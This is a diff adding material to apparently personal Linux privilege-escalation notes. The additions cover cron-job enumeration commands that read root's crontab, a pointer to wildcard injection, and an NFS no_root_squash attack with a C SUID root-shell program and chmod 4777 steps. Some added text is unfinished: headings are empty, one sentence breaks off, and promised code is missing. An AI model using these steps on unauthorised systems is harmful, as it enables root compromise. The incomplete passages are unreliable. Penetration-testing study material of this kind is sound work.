@@ -8,7 +8,22 @@ Viewing `/etc/crontab` is of course the classic.  The cron job format is in the 
 <minute> <hour> <day of month> <month> <day of week> <user> <command>
 ```
 
-Ideally we'll have a vulnerable command being run that we can then exploit.
+Ideally we'll have a vulnerable command being run that we can then exploit.  The following files and commands are worth enumerating to see if anything's been misconfigured or the cron itself is visible publicly.
+
+```
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
 
 In some situation, cron jobs may be hidden from all users, in a users own crontab.  Running the below script will parse the active processes every second and output any changes, which may indicate a hidden cron job.
 
@@ -25,7 +40,52 @@ while true; do
 done
 ```
 
-If the above fails to find anything, then the process may be too short lived to find.  In this case, [Dominic Breuker's pspy](https://github.com/DominicBreuker/pspy) will allow more focused enumeration.
+If the above fails to find anything, then the process may be too short lived to find.  In this case, [Dominic Breuker's pspy](https://github.com/DominicBreuker/pspy) will allow more focused enumeration.  Ideally a writeable file or script may form part of the cron jobs execution.
+
+It is highly recommended to refer to the bible of Linux wildcard injection: [Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) if the running processes utilizes wildcards.  This is quite common in CTF's as well as real-world systems.
+
+### NFS Share
+
+If you find that a machine has a NFS share you might be able to use that to escalate privileges.
+
+```
+# First check if the target machine has any NFS shares
+showmount -e 192.168.1.101
+
+# If it does, then mount it to your filesystem
+mount 192.168.1.101:/ /tmp/
+```
+
+#### no-user-squash
+
+#### no-root-sqash
+
+If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.
+
+There are
+
+This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:
+
+```bash
+chmod 4777 exploit
+```
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main( int argc, char *argv[] )
+{
+    setreuid(0, 0);
+    printf("ID: %d\n", geteuid());
+    execve("/bin/sh", NULL, NULL);
+}
+```
+
+Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code which just goes overboard.
+
+You could also just generate a binary using msfvenom if desired.
 
 ### Abusing Excessive Groups
 
